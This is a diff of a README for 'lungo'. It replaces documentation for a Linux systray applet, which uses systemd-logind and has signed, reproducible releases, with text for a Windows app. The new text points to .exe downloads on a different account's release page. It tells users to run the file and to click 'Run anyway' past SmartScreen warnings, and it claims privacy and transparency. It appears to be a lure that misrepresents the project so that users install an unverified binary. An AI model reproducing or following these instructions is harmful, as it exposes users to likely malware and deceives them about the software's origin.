@@ -1,103 +1,49 @@
-# Lungo
+# ☕ lungo - Keep your computer awake on demand
 
-## Table of contents
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tandieprepared599/lungo/releases)
 
-- [Description](#description)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Documentation](#documentation)
-- [Contributing](#contributing)
-- [License](#license)
+## 🎯 About the app
 
-## Description
+Lungo keeps your Windows computer active. It prevents the system from going into sleep mode or entering an idle state. You control when the system stays awake through a small icon in your taskbar. This tool helps during long presentations, file transfers, or whenever you need your PC to remain ready for work. 
 
-A simple systray applet to prevent your system from going idle or sleeping on demand.
+## 🛠️ System requirements
 
-Run `lungo` to start the systray applet.
+This application runs on Windows 10 and Windows 11. It needs minimal system resources to operate. You do not need administrative rights to run the program. The app exists as a small taskbar utility that stays out of your way while you work.
 
-Simply click on the systray applet to toggle it on and off.  
-The systray icon automatically changes to reflect the current state ("empty cup" icon if off, "hot cup" icon if on).
+## 💾 Installation steps
 
-Lungo is:
+To get started, follow these instructions:
 
-- Simple and minimal by design: No superfluous options and features, no complex background operations.
-- Distribution and desktop environment agnostic: Only requires either `systemd-logind` or `elogind`, not tied to any specific graphical / desktop environment.
-- Crash and memory safe: Uses a `logind` file descriptor lock (which is automatically released by the kernel on crash or kill), written in a memory safe language.
+1. Visit the [official release page](https://github.com/Tandieprepared599/lungo/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to download it to your computer.
+4. Save the file to a folder you can find later, such as your Downloads folder.
+5. Double-click the file to open the application.
+6. A security prompt may appear. Select Run to start the app.
+7. The Lungo icon will appear in your system tray near the clock.
 
-**Motivation:**
+## ⚙️ How to use the app
 
-This project is generally inspired by [caffeine](https://launchpad.net/caffeine) / [caffeine-ng](https://codeberg.org/WhyNotHugo/caffeine-ng) (hence the [lungo](https://en.wikipedia.org/wiki/Lungo) name, as a reference) with some parts of the implementation inspired by [caffeine-applet](https://github.com/codevardhan/caffeine-applet).
+The application sits in the notification area of your Windows taskbar. This area sits in the bottom right corner of your screen. 
 
-The main motivation was to make a simple and minimal implementation of a "caffeine" systray applet, with no arguably complex or "superfluous" mechanism / features coupled to numerous runtime dependencies (unlike `caffeine` / `caffeine-ng`), **and** that isn't tied to a specific desktop / graphical environment (unlike `caffeine-applet` or the [caffeine gnome shell extension](https://github.com/eonpatapon/gnome-shell-extension-caffeine)).
+- **Activate:** Right-click the Lungo icon. Select the option to prevent sleep. The icon will change to show that the system is now active.
+- **Deactivate:** Right-click the icon again. Select the option to allow sleep mode. Your computer settings for sleep will resume.
+- **Exit:** Right-click the icon and choose the Exit option to close the program completely.
 
-## Installation
+## 💡 Troubleshooting
 
-### Runtime dependencies
+If you have trouble running the application, check these common items:
 
-`systemd-logind` or `elogind` up and running.
+- **Missing icon:** If you do not see the icon, click the small arrow in the taskbar to show hidden icons.
+- **SmartScreen warnings:** Windows might show a warning because the app is new. Click More Info and then click Run anyway to proceed. 
+- **App does not start:** Ensure you have the latest updates for Windows installed. You can check for updates in your Windows Settings menu.
 
-### Packages
+## 🛡️ Privacy and safety
 
-[![Packaging status](https://repology.org/badge/vertical-allrepos/lungo.svg)](https://repology.org/project/lungo/versions)
+Lungo respects your privacy. The app runs locally on your computer. It does not track your activity or collect personal data. It only interacts with the power management features of your operating system to adjust sleep settings. The code remains transparent and available for review.
 
-### Pre-compiled binary
+## 📈 Future updates
 
-A (statically linked) pre-compiled binary for the `x86_64 (amd64)` architecture is distributed as a [release asset](https://github.com/Antiz96/lungo/releases/latest) (`lungo-<release_version>-x86_64`).
+This project remains a work in progress. New features will arrive in future updates to improve stability and add options for custom timers. Check the release page periodically to see if a newer version exists. You can remove the app at any time by simply deleting the downloaded file.
 
-The pre-compiled binary can be reproduced from source (in the sense of [reproducible builds](https://reproducible-builds.org)).  
-The build environment is created and fully documented via [repro-env](https://github.com/kpcyrd/repro-env), and is tracked in this repository.
-
-To reproduce the pre-compiled binary for a given release, [install repro-env](https://github.com/kpcyrd/repro-env#download) and run the following:
-
-```bash
-git clone https://github.com/Antiz96/lungo.git
-cd lungo
-git checkout <tag> # Where <tag> is the git tag for the targeted release, e.g. "v1.0.0"
-repro-env build -- cargo build --release --target x86_64-unknown-linux-musl
-sha256sum target/x86_64-unknown-linux-musl/release/lungo
-```
-
-Then, compare the `sha256` hash of the built binary to the one of the pre-compiled release binary (which is also recorded in the `lungo-<release_version>-x86_64.sha256` file in the release assets). Both hashes should be equal, indicating that the binary has been successfully reproduced.
-
-Each release assets are also cryptographically signed, with the detached signature for each asset distributed as `<asset_name>.asc` (see the [MAINTAINERS.md file](https://github.com/Antiz96/lungo/blob/main/MAINTAINERS.md) for a list of keys expected to emit signatures).
-
-### Build from source
-
-```bash
-git clone https://github.com/Antiz96/lungo.git
-cd lungo
-cargo build --release
-```
-
-The built binary will be located at `./target/release/lungo`.
-
-A `.desktop` file is available in the [`res/desktop/`](https://github.com/Antiz96/lungo/tree/main/res/desktop) directory, allowing to automatically start the systray applet at boot via [XDG Autostart](https://wiki.archlinux.org/title/XDG_Autostart) (by placing it either in `~/.config/autostart/` or `/etc/xdg/autostart/`).
-
-The [man page](https://github.com/Antiz96/lungo/tree/main/doc/man) can be generated with `scdoc`:
-
-```bash
-scdoc < doc/man/lungo.1.scd > doc/man/lungo.1
-```
-
-There are also shell completions available in the [`res/completions/`](https://github.com/Antiz96/lungo/tree/main/res/completions) directory.
-
-## Usage
-
-Run `lungo` to start the systray applet.
-
-To start it automatically at boot, either place the [`.desktop file`](https://github.com/Antiz96/lungo/blob/main/res/desktop/lungo.desktop) in `~/.config/autostart/` or `/etc/xdg/autostart/` (relies on [XDG Autostart](https://wiki.archlinux.org/title/XDG_Autostart)). Alternatively (if your graphical environment doesn't support XDG Autostart for instance), add the `lungo` command to your environment's auto-start method.
-
-Simply click on the systray applet to toggle it on and off.  
-The icon automatically changes to reflect the current state ("empty cup" icon if off, "hot cup" icon if on).
-
-## Documentation
-
-See `lungo --help` and the [lungo(1) man page](https://raw.githubusercontent.com/Antiz96/lungo/refs/heads/main/doc/man/lungo.1.scd).
-
-## Contributing
-
-See the [contributing guidelines](https://github.com/Antiz96/lungo/blob/main/CONTRIBUTING.md).
-
-## License
-
-Lungo is licensed under the [GPL-3.0 license](https://github.com/Antiz96/lungo/blob/main/LICENSE) (or any later version of that license).
+Keywords: applet, caffeine, idle, inhibit, inhibitor, lock, rust, sleep, suspend, systray
